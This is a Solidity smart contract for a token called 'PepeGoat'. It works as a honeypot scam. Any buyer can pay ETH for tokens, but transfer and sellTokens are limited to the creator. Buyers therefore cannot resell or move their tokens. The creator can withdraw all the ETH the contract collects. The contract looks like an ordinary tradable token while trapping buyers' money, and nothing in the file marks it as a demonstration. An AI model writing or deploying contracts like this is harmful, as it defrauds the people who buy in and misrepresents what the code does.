// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PepeGoat {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public creator;

    modifier onlyCreator() {
        require(msg.sender == creator, "Only the creator can perform this action");
        _;
    }

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = 1_000_000_000 * 10**decimals; // Set the total supply to 1 billion tokens
        balanceOf[msg.sender] = totalSupply; // Assign the total supply to the creator's wallet
        creator = msg.sender;
    }

    function buyTokens() external payable {
        require(msg.value > 0, "Insufficient funds");

        uint256 ethAmount = msg.value;
        uint256 tokenAmount = ethAmount * 1000; // 1 ETH = 1000 tokens

        require(balanceOf[creator] >= tokenAmount, "Insufficient token balance");

        balanceOf[creator] -= tokenAmount;
        balanceOf[msg.sender] += tokenAmount;
    }

    function sellTokens(uint256 _amount) external onlyCreator {
        require(balanceOf[creator] >= _amount, "Insufficient token balance");

        balanceOf[creator] -= _amount;
    }

    function transfer(address _to, uint256 _amount) external onlyCreator {
        require(balanceOf[creator] >= _amount, "Insufficient token balance");

        balanceOf[creator] -= _amount;
        balanceOf[_to] += _amount;
    }

    function withdrawFunds() external onlyCreator {
        uint256 contractBalance = address(this).balance;
        require(contractBalance > 0, "No funds to withdraw");

        payable(msg.sender).transfer(contractBalance);
    }
    
    function approve(address _spender, uint256 _amount) external returns (bool) {
        allowance[msg.sender][_spender] = _amount;
        return true;
    }

    receive() external payable {
        revert("Fallback function not allowed");
    }
}